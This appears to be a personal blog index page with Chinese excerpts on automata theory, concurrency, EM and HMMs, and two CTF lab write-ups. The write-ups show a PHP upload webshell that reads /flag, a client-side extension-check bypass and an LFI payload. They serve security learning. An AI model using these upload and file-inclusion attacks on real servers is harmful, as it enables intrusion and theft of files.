

<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <title> [ Dnull_P Welcome~ ]</title>
  
  <!-- stylesheets list from _config.yml -->
  
  <link rel="stylesheet" href="/css/Genso.css">
  
  <link rel="stylesheet" href="/css/layout/layout.css">
  
  <link rel="stylesheet" href="/css/layout/navigator.css">
  
  <link rel="stylesheet" href="/css/layout/page-container.css">
  
  <link rel="stylesheet" href="/css/layout/page-cover.css">
  
  <link rel="stylesheet" href="/css/layout/slidebar.css">
  
  <link rel="stylesheet" href="/css/index/index.css">
  
  <link rel="stylesheet" href="/css/index/recommend-card-container.css">
  
  <link rel="stylesheet" href="/css/index/card-container.css">
  
  <link rel="stylesheet" href="/css/index/card.css">
  
  <link rel="stylesheet" href="/css/post/post.css">
  
  <link rel="stylesheet" href="/css/post/idea.css">
  
  <link rel="stylesheet" href="/css/tool/color.css">
  
  
  <script>
    const urlList = ('https://s2.loli.net/2023/07/23/mivfcl7wqgVsYdP.jpg,https://s2.loli.net/2023/07/23/E3uyek7OVlJgtLT.jpg,https://s2.loli.net/2023/07/23/q9skN6cPAZ14fwH.png,https://s2.loli.net/2023/07/23/RedmkprBY81ZhaV.jpg,https://s2.loli.net/2023/07/23/pt1ArR7NqO8vMXl.png,https://s2.loli.net/2023/07/23/MZEW5UCFSBPiNvH.png,https://s2.loli.net/2023/07/23/8urpklSmq6xR5LF.jpg,https://s2.loli.net/2023/07/23/E6Os9tkrRP4FZ7f.jpg,https://s2.loli.net/2023/07/23/IPq4HsZCOfTMGxk.jpg,https://s2.loli.net/2023/07/23/sAhIbjyLeMBgfuw.jpg,https://s2.loli.net/2023/07/23/ipTsxHoDOawRrfM.png,https://s2.loli.net/2023/07/23/eTYKcWz7jb5mqyo.png,https://s2.loli.net/2023/07/23/lHLk3OMeY7qXnTP.jpg,https://s2.loli.net/2023/07/23/u9dvATztknGecmI.jpg,https://s2.loli.net/2023/07/23/calWvPZEbI9tG4o.png,https://s2.loli.net/2023/07/23/MLZr1j7hdDnIHGU.png,https://s2.loli.net/2023/07/23/PlqeV1XpgQrxI8u.jpg,https://s2.loli.net/2023/07/23/uWQXFEBh5iCcNJV.png,https://s2.loli.net/2023/07/23/xjcUksAMvHQVhim.jpg,https://s2.loli.net/2023/07/23/Bd46rfJ2HYhQGkM.jpg,https://s2.loli.net/2023/07/23/1BgtkI3Aw58qrGv.jpg,https://s2.loli.net/2023/07/23/z8naFUvWV7BfKud.jpg,https://s2.loli.net/2023/07/23/Xj4wlzuKTDQOmHh.png,https://s2.loli.net/2023/07/23/mKzLHqPkUWTivAu.png,https://s2.loli.net/2023/07/23/a36bWlVynziMrSU.jpg,https://s2.loli.net/2023/07/23/6ZNUeJAtDCRvWq8.jpg,https://s2.loli.net/2023/07/23/7nGYxgcyoi8aSIR.jpg,https://s2.loli.net/2023/07/23/EVeCvBAt1LOgJSU.jpg,https://s2.loli.net/2023/07/23/onE5MQBPGdzDROh.jpg,https://s2.loli.net/2023/07/23/316kgDancGthANM.jpg,https://s2.loli.net/2023/07/23/oeRXvLm5byqgazF.jpg,https://s2.loli.net/2023/07/23/HXj7NsSW5vyCoIn.jpg,https://s2.loli.net/2023/07/23/sqM2XznWeEol3f4.jpg,https://s2.loli.net/2023/07/23/xGAflC5roSOsJRz.jpg,https://s2.loli.net/2023/07/23/cF2oWANXImMREKx.jpg,https://s2.loli.net/2023/07/23/IqutSTML7EXRza3.jpg,https://s2.loli.net/2023/07/23/zYNG9XHIEfg4quh.png').split(',');
  </script>

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div class="background">
  

  <img src="https://s2.loli.net/2023/07/23/uWQXFEBh5iCcNJV.png" alt="">

  <div class="title-text animate__animated animate__bounce">
    <h1>This is
      <span class="name">
        Dnull_P
      </span>
    </h1>
    Welcome Hell !

  </div>
</div>

<div class="background-coverage">
  <!--Typed text-->
  <div class="background-coverage-text">
    <span id="background-coverage-text">
    </span>
  </div>
</div>

<div class="background-occupation">

</div>

  <div class="navigator">
  <div class="navi-buttom-container">
    
    
  <a href="/" class="navi-buttom">
    <div>
      Home
    </div>
  </a>
  
  
    
  <a href="/about" class="navi-buttom">
    <div>
      About
    </div>
  </a>
  
  
    
  <a href="/contact" class="navi-buttom">
    <div>
      Contact
    </div>
  </a>
  
  
    
    <div class="navi-dropdown">
      <div class="dropbtn">
        post
      </div>
      <div class="dropdown-content">
        
        <a href="/archives">
          Aarchives
        </a>
        
        <a href="/tags">
          Tags
        </a>
        
      </div>
    </div>
  </div>
  
  
</div>

  <div class="page-container">
    <div class="slidebar-warp">
  <div class="slidebar">
    <div class="panel">

      <div class="avatar">
        <img src="/pic/avatar.jpg" alt="">
      </div>

      <div class="info">
        <div class="subinfo-1">
          <div class="subinfo-1-left">
            <div class="subinfo-1-left-info">
              <div class="subinfo-1-left-info-inner">
                <div class="subinfo-1-left-info-front">
                  Post
                </div>
                <div class="subinfo-1-left-info-back random-color">
                  156
                </div>
              </div>
            </div>

            <div class="subinfo-1-left-info">
              <div class="subinfo-1-left-info-inner">
                <div class="subinfo-1-left-info-front">
                  Cate
                </div>
                <div class="subinfo-1-left-info-back random-color">
                  37
                </div>
              </div>
            </div>

            <div class="subinfo-1-left-info">
              <div class="subinfo-1-left-info-inner">
                <div class="subinfo-1-left-info-front">
                  Tag
                </div>
                <div class="subinfo-1-left-info-back random-color">
                  191
                </div>
              </div>
            </div>

          </div>

          <div class="subinfo-1-right">
            <div class="subinfo-1-right-inner">
              <div class="subinfo-1-right-front">
                This Month
              </div>
              <div class="subinfo-1-right-back random-color">
                2
              </div>
            </div>
          </div>
        </div>

        <div class="subinfo-2-wrap">
          <div class="subinfo-2">

            
            <div class="sociallink">
    <a href=https://github.com/DnullP>
      <img src="/svg/github.svg" alt="">
    </a>
</div>
            

          </div>
        </div>
      </div>

      <div class="more-opt">

      </div>

    </div>

    <div class="icon-warp">


      <button class="hide-slidebar-button">
        <img src="/svg/arrow-right-line.svg" id="slideBarArrow">
      </button>


    </div>
  </div>
</div>

    <div class="content">
      




<div class="card-container">

  <div class="card-list-title">
  <div class="card-list-title-text">
    <h2 class="divider">
      
      文章列表
      
    </h2>
  </div>
  
</div>

  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-09
      </div>
      <div class="card-info">
        3.1k字
      </div>
      <div class="card-info">
        阅读时间: 3 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/09/automata-theory/CH6-CFG-reduction/">
        形式语言与自动机 CFG的化简和规范
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
# 上下文无关文法的化简

上下文无关文法的化简可以分为三个部分:

- 无用符号的消除
- 空产生式的消除
- 单一产生式的消除

## 无用符号的删除

我们给无用符号以下含义:

- 从初始符号开始, 无法到达的符号都是无用的, 可以删除
- 从每个终结符开始, 无法归约到的符号都是无用的, 可以删除

于是我们去除无用符号的算法可以描述为:

1. 将初始符号加入一个集合, 并向后推导符号, 并将推导出的符号加入集合, 迭代直到集合不产生变化
2. 将所有终结符加入一个集合, 并向前推导符号, 并将推导出的符号加入集合, 迭代直到集合不产生变化
3. 不在两个集合中的符号都是无用的, 可以删除

## 空产生式的删除

除了语言本身就是空的情况, 文法中的其他空产生式都可以删除

删除的方式可以简单概括为:

- 将所有的空产生式产生的空符号, 带入上一级的符号中, 令其产生新的推导式, 并删除该空产生式

语言描述比较抽象, 通过以下例子说明:

- 原文法
  - S -&gt; aA
  - A -&gt; b|ε
- 将A等于空的情况带入S中, 得到
  - S -&gt; a|aA
- 删除空产生式A -&gt; ε, 得到
  - S -&gt; a|aA
  - A -&gt; b

## 单一产生式的删除

我们认为由一个非终结符推导出一个非终结的产生式是无用的, 可以用类似空产生式替换的方法删除, 例子如下:

- 原文法
  - S -&gt; aA
  - A -&gt; aB|cD|e|F
  - F -&gt; a|cB

- 这里的A -&gt; F是一个单一产生式, 是无用的, 通过将F的产生式带入A中, 得到删减后的文法:
- S -&gt; aA
- A -&gt; aB|cD|e|a|cB

## tips

- 由于删除单一产生式和空产生式有可能产生新的无用符号, 所以需要在最后再执行一遍无用符号的删除

---

# 上下文无关文法的规范

- 乔姆斯基范式
- 格雷巴赫范式

## 乔姆斯基范式

$$
A \rightarrow BC\\
A \rightarrow a\\
$$

## 格雷巴赫范式

$$
A \rightarrow a\\
A \rightarrow aA_1A_2...A_n
$$

为何得到格雷巴赫范式, 我们需要以下三个步骤:

- 1. 将CFG简化
- 2. 将CFG转化为CNF
- 3. 将CNF中的左递归去除
- 4. 将CNF转换为CFG

例子: 将CFG转换为CNF:
$$
S → aSb | bSa | SS | a
$$

1. 化简
$$
S → aSb | bSa | SS | a |
$$
本身已是最简
2. 转化为CNF

- $$
  S → ASB | BSA | SS\\
  S → a\\
  $$
- $$
  S → AX | BY | SS | a\\
  X → SB\\
  Y → SA\\
  A → a\\
  B → b\\
  $$

3. 去除左递归
  左递归为$S → SS$, 删除步骤如下:

- 首先删除$S → SS$, 添加$C → SSC|\epsilon$
- 将$C$添加到每个其他$S$的产生式中, 得到:
    $$
    S → AXC | BYC | aC\\
    C → SSC | ε\\
    X → SB\\
    Y → SA\\
    A → a\\
    B → b\\
    $$
- 删除空产生式:
    $$
    S → AXC | BYC | aC | AX | BY | a\\
    C → SSC | SS\\
    X → SB\\
    Y → SA\\
    A → a\\
    B → b\\
    $$

4. 替换首个变量:
    $$
    S → aXC | bYC | aC | aX | bY | a\\
    C → aSC | aS\\
    X → aB\\
    Y → aA\\
    A → a\\
    B → b\\
    $$
将CFG转换为GNF将有利于我们为其构造等价的下推自动机(PDA)

---

# 下推自动机

下推自动机在有限状态自动机的基础上, 添加了一个栈结构, 用来模拟文法的推导过程:

比如我们有以下文法:
$$
S → AB\\
A → 0A | ε\\
B → 0B1 | 01
$$

我们的推导过程如下:

`S` -&gt; `AB` -&gt; `0AB` -&gt; `AB + out:0` -&gt; `B` -&gt; `01` -&gt; `out: 01`

最后的输出为`001`
左为栈顶, 右为栈底, 这个过程在栈上完成

于是下推自动机就引入一个栈, 来表示文法的推导过程

现在假如我们有一段输入`001`, 并且PDA栈中的元素只有开始状态$S$, 我们从左到右开始读取, 如果读取到0时, 我们可以找到正向推导中有0输出的一步, 但是并没有找到栈中为$S$时的读0情况, 所以我们认为此时为读空, 所以将$S$取出, 替代为$AB$

这个第一步记为:
$$\delta(q_0, \epsilon, S) = (q_0, AB)$$

类似的我们可以写出这个PDA的所有转换:
$$
\delta(q_0, \epsilon, A) = (q_0, 0A)\\
\delta(q_0, \epsilon, A) = (q_0, \epsilon)\\
\delta(q_0, \epsilon, B) = (q_0, 0B1)\\
\delta(q_0, \epsilon, B) = (q_0, 01)\\
\delta(q_0, \epsilon, 1) = (q_0, \epsilon)\\
\delta(q_0, \epsilon, 0) = (q_0, \epsilon)\\
$$
这是全部读取写为空的情况, 也可以写为不为空的情况, 写法可以自由决定:
$$
\delta(q_0, 0, A) = (q_0, A)\\
\delta(q_0, \epsilon, A) = (q_0, \epsilon)\\
\delta(q_0, 0, B) = (q_0, B1)\\
\delta(q_0, 0, B) = (q_0, 1)\\
\delta(q_0, \epsilon, 1) = (q_0, \epsilon)\\
\delta(q_0, \epsilon, 0) = (q_0, \epsilon)\\
$$

可以用状态转移图来表示:
```Mermaid
stateDiagram
    [*] --&gt; q0
    q0 --&gt; q0: 0, A/A
```
表示读0时, 栈顶为A时, 取出A, 替换为A

PDA的接收状态有两类, 一类是空栈接收, 一类是终态接收:
- 空栈接收: 只要输入$w$能够使PDA进入空栈状态, 我们则接收句子
- 终态接收: 只要输入$w$能够使PDA进入终态, 我们则接收句子
两种接收可以互相转换

由PDA推导CFG的过程实在不好写, 跳过不记了, 原理其实相当简单


      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-05
      </div>
      <div class="card-info">
        2k字
      </div>
      <div class="card-info">
        阅读时间: 2 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/05/ctf-note/upload-attack/">
      闲人的ctf记录
    </a>
    <span class="card-abstract">
      
upload一共包含了20个pass

每个pass要上传一个文件以攻击服务器
比如题目提供的server框架是php环境的, 所以我们可以通过提交一个php文件来攻击服务器

比如我写了如下php代码
```php
&lt;!-- 输出当前目录全部文件和文件夹 --&gt;
&lt;?php
$dir = opendir(&#39;.&#39;);
while($file = readdir($dir)){
    echo $file.&#39;&lt;br&gt;&#39;;
}
closedir($dir);
?&gt;

&lt;!-- 输出根文件夹下的flag --&gt;

&lt;?php
$dir = opendir(&#39;/&#39;);
while($file = readdir($dir)){
    if($file == &#39;flag&#39;){
        echo file_get_contents(&#39;/flag&#39;);
    }
}
closedir($dir);
?&gt;
```
我只要想办法将其上传到服务器, 并知道其在服务器中的位置就可以远程执行脚本攻击

当然, 服务器不会就这么让你上传木马文件, 所以会采取各类措施来保证服务端的安全, 我们需要做的就是想办法绕过这些安全检测

---

## pass 1
这道题要上传一个webshell, 如果我们上传非图片格式文件, 网页会在本地的js脚本中检测文件名来判断是否为图片

由于检测发生在本地, 所以解决方式多种多样, 我们可以直接看如下代码:
```js
&lt;script type=&#34;text/javascript&#34;&gt;
    function checkFile() {
        var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
        if (file == null || file == &#34;&#34;) {
            alert(&#34;请选择要上传的文件!&#34;);
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = &#34;.jpg|.png|.gif&#34;;
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf(&#34;.&#34;));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = &#34;该文件不允许上传，请上传&#34; + allow_ext + &#34;类型的文件,当前文件类型为：&#34; + ext_name;
            alert(errMsg);
            return false;
        }
    }
&lt;/script&gt;
```
我选择在`allow_ext`中添加`.php`来绕过检测, 然后上传文件

然后网页会对上传的文件进行反馈显示, 监测网络传输可以找到上传文件的目录:

```
GET /upload/interlude_fubuki.png HTTP/1.1
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
Cache-Control: no-cache
Host: dd8934b9-6fe8-492e-9bdd-59ae1bf61dfe.node4.buuoj.cn:81
Pragma: no-cache
Proxy-Connection: keep-alive
Referer: http://dd8934b9-6fe8-492e-9bdd-59ae1bf61dfe.node4.buuoj.cn:81/Pass-01/index.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62
```
于是我们只要对该目录下上传的php文件进行请求即可完成攻击
    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-04
      </div>
      <div class="card-info">
        935字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/04/ctf-note/linux-usage/">
        闲人的ctf记录
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
CFT的题包含的知识面相当广泛, 多做一做能学到不少东西, 所以在一天最后的时间里, 不妨看几道CTF题, 拓展拓展能力

---
## Basic Linux Lab
这道题目要求登录指定的linux服务器并找到flag, 给出了服务器域名和端口, 所以我们使用ssh指令登录服务器:
```bash
ssh -pxxxxx root@xxx.xxx.xxx.xxx
```
登录之后检查文件目录:
```bash
ls -a
cd ~
ls -a
ls -All
```
几番查找下找到`flag.txt`文件, vim打开获得内容:
```bash
vim flag.txt
```

---
## Basic LFI COURSE 1

`LFI(Local File Inclusion)是一种常见的web漏洞, 通过构造恶意的url, 可以让服务器读取本地文件, 从而获取敏感信息`

于是题目给了我们一个网址, 打开以后显示如下内容:
```html
&lt;?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:07 AM
 */

highlight_file(__FILE__);

if(isset($_GET[&#39;file&#39;])) {
    $str = $_GET[&#39;file&#39;];

    include $_GET[&#39;file&#39;];
}
```
看起来是包含了一段php脚本, highlight_file返回了脚本的高亮显示
`$_GET[&#39;file&#39;]`从传递参数中获得`file`并包含这个文件, 所以我需要知道服务器中的flag的位置
虽然直接输入`file=/flag`就找到答案就是了

---

## Basic BUU BRUTE 1
简单的爆破, 没什么值得说的, 需要注意的是请求过快会导致服务器拒绝服务, 所以需要控制并行的请求速度
      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-03
      </div>
      <div class="card-info">
        1.6k字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/03/automata-theory/CH45-RL-MyhillNerode/">
      形式语言与自动机 Myhill-Nerode定理
    </a>
    <span class="card-abstract">
      
# Myhill-Nerode定理

定理规定以下三个命题同时成立:

1. $L \subseteq \Sigma^*$是正则语言
2. $L$是$\Sigma^*$上的某一个具有有穷指数的右不变等价关系$R$的某些等价类的并
3. $R_L$具有有穷指数

好, 看到书上的三个命题已经懵逼的了

我们从第二条命题中提取我们所不知道的两个关键名词**有穷指数**和**右不变等价关系$R$**

## 右不变等价关系

- 定义: 设$R$是$\Sigma^*$上的等价, 对于$\forall x, y \in \Sigma^*$, 如果$xRy$成立, 则$xzRyz$也成立, $z \in \Sigma^*$, 则称$R$为右不变等价关系

然后我们可以定义以下两种右不变等价关系:

- $R_L$: 对于一个语言$L \subseteq \Sigma^*$, $xR_Ly$表示对于$\forall x,y,z \in \Sigma^*$, $xz \in L \Leftrightarrow yz \in L$
  也就是说在任意的$x,y$后加上一个$z$, 两者要么都是$L$的成员, 要么都不是$L$的成员

- $R_M$: 对于一个自动机$M$, $xR_My \Leftrightarrow \delta(q_0, x) = \delta(q_0, y)$
  也就是说, 两个字符串可以使得自动机停在同一个状态

通过这两种右不变等价关系我们可以把$\Sigma^*$分成若干**等价类**

对于一个自动机确定的右不变等价关系$R_M$, 我们可以得到对应的语言的$R_L(M)$

## 关系的指数
我们记$|\Sigma^*/R|$为$R$关于$\Sigma^*$的指数, 简称$R$的指数, 其代表的是通过$R$关系能把$\Sigma^*$分成的等价类的数量

---

有了这两个名词的了解就可以去理解Myhill-Nerode定理的三条等价命题了

我们可以通过后两条命题判定一个语言是不是正则语言:

- 我们可以通过构造某个右不变等价关系, 来使得L是其中等价类的并
- 我们可以用$L$来构造右不变等价关系, 并判定其指数是否有穷

---

# DFA最小化
正则语言有对应的最小化DFA, 存在以下算法求解:

- 首先我们给出一个DFA状态**是否可区分**的判断标准: 如果, 状态$q$和$p$同时只有一个能接受某个句子, 那么则称$q$和$p$是可区分的, 符号表达为:$\exists x \in \Sigma^*, \delta(q, x) \neq \delta(p, x) and \space one \space is \space accept$

- 求解最小化DFA的过程就是将所有的不可区分状态合并的过程

算法步骤:
1. 将所有$F \times (S-F)$的状态对标记为可区分
2. 对于所有的$F \times F$和$(S-F) \times (S-F)$的状态对, 我们通过搜索的方式, 将字母表$\Sigma$中的每个字母作为输入, 改变其状态, 如果搜索到某个状态对是可区分的, 则该状态对标记为可区分
3. 如此运行到最后, 剩下的状态对即为不可区分的状态对, 将其全部两两合为一个状态即可

类似的去重思想在后面的上下文无关文法中也会有所体现
    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-03-20
      </div>
      <div class="card-info">
        727字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/03/20/operating-system/CH2-Concurrency-datastruct/">
        多线程数据结构
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
# 多线程数据结构

## 多线程计数器(counter)

我们在之前的例子中我们有多线程计数器的实现, 只需要在对变量累加前后加上锁即可

但是加锁和解锁的操作对这个简单的加数来说, 造成了很大的额外开销, 即便在多线程的摊销下所花的时间并没有增加

为此有一种 **approximate counter(近似计数器)** 的方法:

每个cpu都有一个计数器, 每个线程在各自的cpu上计数, 每过一段时间就会把自己的计数器的值加到一个全局共享的计数器上, 然后把自己的计数器清空, 如果想要在这个过程中读取计数器的值, 就需要将所有的计数器累加起来, 不过cpu在各自的局部计数器上不需要频繁的加锁解锁了, 只需要在累加到全局计数器的时候加锁即可

## 多线程链表

我们可以给链表的关键操作加上锁:
- insert
  我们先申请一个新节点, 将新节点赋值, 然后加锁, 把它插入链表之中, 完成后解锁
  我们加锁的过程是在修改链表的前后, 而不是申请新节点之前, 因为如果在申请新节点失败后, 我们的锁得不到释放, 就会造成资源占用, 死锁等问题

- look_up
  查询操作也需要加锁, 以免在查询中修改链表指针, 导致不可预测的情况出现

## 多线程队列

对于一个队列, 只有前后指针需要修改, 所以加锁的也只有这一部分, 可以比较简单地实现

      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-03-18
      </div>
      <div class="card-info">
        2.7k字
      </div>
      <div class="card-info">
        阅读时间: 2 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/03/18/ML/EM/">
      EM算法
    </a>
    <span class="card-abstract">
      
当我们使用极大似然估计(MLE)来估计参数时, 我们是已知若干样本, 通过求一个参数使得出现这些样本的概率最大, 来计算参数的

如果在这种问题中, 如果我们将满足两个不同分布的类别混在一起, 此时要做最大似然估计, 并且将两类分开, 该怎么做呢?

此时我们有两类分布的参数$\theta_a$和$\theta_b$, 还有样本属于$A$类样本的概率$\pi$, 我们简单用$\theta$表示三个参数的集合

于是我们可以画出概率树:

```Mermaid
flowchart LR
    样本---|π|属于A类
    样本---|1-π|属于B类
    属于A类---|θ_a|正面1
    属于A类---|1-θ_a|反面1
    属于B类---|θ_b|正面2
    属于B类---|1-θ_b|反面2
```
我们只能观测到概率树第三层的结果, 但是观测不到第二层, 所以我们无法直接用最大似然法来估计参数$\theta$

为了解决问题, 我们先写出问题的似然函数:
$$
L(X,Z,\theta_a,\theta_b,\pi) = L(X,Z,\theta)
$$
EM算法是一种迭代算法, 我们可以先给定一个初始化的参数$\theta^{(0)}$, 然后似然函数就可以写成:
$$
L(X,Z,\theta^{(0)}) = \prod_{Z}{P(X_i,\theta^{(0)}; Z_i)}\\
\log{L(X,Z,\theta^{(0)})} = \sum_{Z}{\log{P(X_i,\theta^{(0)}; Z_i)}}
$$
此时函数中未知的就只有未观察到的数据$Z$, 我们就可以用极大似然法来求出$Z$的极大似然估计

由于每一组$X_i$和$Z_i$是相互独立的, 所以我们可以单独求出每一个$Z_i$的极大似然估计, 我们可以写出下式:
$$
\begin{aligned}
P(Z_{i}|X_i,\theta^{(0)}) &amp;= \frac{P(X_i|Z_{i},\theta^{(0)})P(Z_{i}|\theta^{(0)})}{P(X_i|\theta^{(0)})} \\
&amp;= \frac{P(X_i|Z_{i},\theta^{(0)})P(Z_{i}|\theta^{(0)})}{\sum_{Z_i}{P(X_i|Z_i,\theta^{(0)})P(Z_i|\theta^{(0)})}}
\end{aligned}
$$
为了方便求出上式的最值, 我们可以按照下表的信息化简上式:
| |正面|反面| |
|:--:|:--:|:--:|:--:|
|**属于A类**|$\piθ_a$|$\pi(1-θ_a)$|$\pi$|
|**属于B类**|$(1-\pi)θ_b$|$(1-\pi)(1-θ_b)$|$(1-\pi)$|
|**总和**|$\piθ_a+(1-\pi)θ_b$|$\pi(1-θ_a)+(1-\pi)(1-θ_b)$|$1$|

$$
\begin{aligned}
P(Z_{i}|X_i,\theta^{(0)}) &amp;= \frac{\theta_a^{(X_i)}(1-\theta_a)^{(1-X_i)}\pi^{Z_i}}{\theta_a^{(X_i)}(1-\theta_a)^{({1-X_i})}\pi^{Z_i}+\theta_b^{(X_i)}(1-\theta_b)^{({1-X_i})}(1-\pi)^{1-Z_i}} \\
&amp;= \mu_i
\end{aligned}
$$
然后我们就能根据上式计算出$Z$的极大似然估计, 上述步骤我们称为**E步**, 也就是**Expectation步**

有了$Z$数据的估计以后, 我们又能反过来用极大似然法估计$\theta$的值, 以此为迭代循环, 最后能够得到$\theta$的估计值, 并且获得了$Z$数据的估计值, 这个步骤我们称为**M步**, 也就是**Maximization步**

在E步中, 我们可以直接构造一个**Q函数**:
$$
Q(\theta,\theta^{(k)}) = E_Z[\log P(X,Z;\theta)|X,\theta^{(k)}]
$$
也就是在给定观测结果和初始参数的情况下, 关于$Z$的极大似然函数的期望, 化简如下:
$$
\begin{aligned}
Q(\theta,\theta^{(k)}) &amp;= E_Z[\log P(X,Z;\theta)|X,\theta^{(k)}] \\
&amp;= \sum_{Z}{\log P(X,Z;\theta)P(Z|X,\theta^{(k)})} \\
\end{aligned}
$$
M步只要最大化Q函数就可以了

### 如何计算Q函数的最大化:
$$
\begin{aligned}
Q(\theta,\theta^{(k)}) &amp;= \sum_{X}\sum_{Z}{\log P(X_i,Z_j;\theta)\underline{P(Z_i|X_j,\theta^{(k)}})} \\
&amp;\text{横线部分用之前推出的式子代替}\\
&amp;= \sum_{X}{\mu_i\log{P(X_i|Z_a,\theta)}P(Z_a|\theta)+(1-\mu_i)}\log{P(X_i|Z_b,\theta)}P(Z_b|\theta) \\
&amp;= \sum_{X}{\mu_i\log{(\pi\theta_a^{(X_i)}(1-\theta_a)^{(1-X_i)}}}) + (1-\mu_i)\log{((1-\pi)\theta_b^{(X_i)}(1-\theta_b)^{(1-X_i)}}) \\
\end{aligned}
$$
这个式子中包含了$\theta$和$\mu$两组未知参数, 我们对$\theta$中的参数求导, 并令结果为0, 化简以后就可以得到$\theta$的关于$\mu$的最大化的表达式
然后我们再通过E步骤中求出$\mu$的最大化值即可得到一轮迭代的参数

---
这个算法真的给我不扎实的概率论基础上了一课, 关于Q函数的证明部分我已经不想管了, 具体的实现靠以上的信息已经足够了
    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-03-17
      </div>
      <div class="card-info">
        4.1k字
      </div>
      <div class="card-info">
        阅读时间: 4 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/03/17/ML/HMM/">
        
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
# 隐马尔可夫模型

## 马尔可夫链

说起隐马尔可夫模型, 首先介绍马尔可夫链

### 随机过程

$X$是一个随机变量, 当我们在一个时间轴上不同的时间点上时, 这个随机变量的分布不同, 则我们令这个随时间变化的随机变量为$X_t$, $t$为时间, 我们称其为一个随机过程

我们称下式为随机过程的分布函数:
$$
F(x ; t) = P(X_t \leq x)
$$

如果有很多不同的$t$构成不同的分布函数, 我们称其为**分布函数族**:
$$
F(x_1, x_2, \cdots, x_n ; t_1, t_2, \cdots, t_n) = P(X_{t_1} \leq x_1, X_{t_2} \leq x_2, \cdots, X_{t_n} \leq x_n)
$$

### 马尔可夫链

- 马尔可夫性:
  我们可以把一个时间点作为一个状态, 而在随机过程的进行中, 将来处于什么状态和过去处于过什么状态无关, 我们称其为**马氏性(Markov property)**, 又叫无记忆性, 无后效性

也就是说, 一个状态如何转移只和当前的状态有关, 由此构成的状态机形成一个**马尔可夫链**

```Mermaid
stateDiagram
    direction LR
    [*] --&gt; State1 : 0.2
    [*] --&gt; State4 : 0.8
    State1 --&gt; State3 : 0.3
    State1 --&gt; State2 : 0.7
    State4 --&gt; State2 : 1
    State2 --&gt; State3 : 1
    State3 --&gt; State1 : 1
```

---

现在话题回到隐马尔可夫模型

隐马尔可夫模型首先要有一个马尔可夫链, 我们称其为**隐马尔可夫链**, 可以用一个状态转移矩阵表达:
$$
